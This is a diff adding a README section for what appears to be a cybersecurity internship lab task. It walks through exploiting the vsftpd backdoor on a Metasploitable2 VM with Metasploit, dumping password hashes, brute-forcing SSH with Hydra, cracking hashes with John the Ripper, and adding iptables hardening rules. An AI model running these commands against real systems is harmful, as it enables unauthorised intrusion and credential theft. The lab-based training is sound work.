@@ -303,3 +303,76 @@ Bash
 Header always set X-Frame-Options "DENY"
 Header always set X-Content-Type-Options "nosniff"
 Header always set Content-Security-Policy "default-src 'self'"
+```
+
+``                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+``                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
+**# 🛡️ Cybersecurity & Ethical Hacking Internship - Task 4**
+
+**Company:** ApexPlanet Software Pvt. Ltd.  
+**Domain:** Cybersecurity & Ethical Hacking  
+**Task Name:** Exploitation & System Security  
+**Timeline:** Days 37–48  
+
+---
+
+## 📌 Objective
+To learn the professional penetration testing workflow, execute authorized exploits responsibly, perform password security audits, and implement core system hardening measures.
+
+---
+
+## 🛠️ Lab Environment Setup
+- **Attacker Machine:** Kali Linux (Rolling Release)
+- **Target Machine:** Metasploitable2 (Vulnerable Test VM)
+- **Primary Tools:** Metasploit Framework, Hydra, John the Ripper, iptables, Netcat
+
+---
+
+## 📖 Key Concepts & Technical Overview
+
+### 1. Penetration Testing Methodology
+- Follows structured phases: **Reconnaissance $\rightarrow$ Scanning $\rightarrow$ Exploitation $\rightarrow$ Post-Exploitation $\rightarrow$ Reporting** to ensure systematic security assessments.
+
+### 2. Exploitation & Post-Exploitation
+- Leveraging known vulnerabilities (e.g., service backdoors) via Metasploit to establish reverse shells and extract system info and password hashes.
+
+### 3. Password Attacks & Brute-Forcing
+- Assessing authentication strength using credential dictionary attacks (Hydra) and offline hash cracking (John the Ripper).
+
+### 4. System Hardening & Mitigation
+- Securing hosts by patching vulnerabilities, disabling unnecessary background services, and enforcing firewall restrictions.
+
+---
+
+## 📖 Step-by-Step Execution Guide & Commands
+
+### Step 1: Exploitation with Metasploit
+```bash
+# Start Metasploit Console
+msfconsole
+
+# Search and select an exploit (e.g., vsftpd backdoor)
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <Metasploitable2_IP>
+exploit
+
+# Post-Exploitation Commands (once session is active):
+sysinfo
+hashdump
+
+Step 2: Password Attacks (Hydra & John)
+Bash
+# Brute-force SSH service using Hydra
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://<Metasploitable2_IP>
+
+# Crack captured password hashes using John the Ripper
+john --wordlist=/usr/share/wordlists/rockyou.txt hashed_passwords.txt
+
+Step 3: System Hardening & Defense
+Bash
+# Check active firewall rules
+sudo iptables -L -v -n
+
+# Block vulnerable or unused services (e.g., Telnet port 23)
+sudo iptables -A INPUT -p tcp --dport 23 -j DROP                                                                                                                                                                                                                                                    
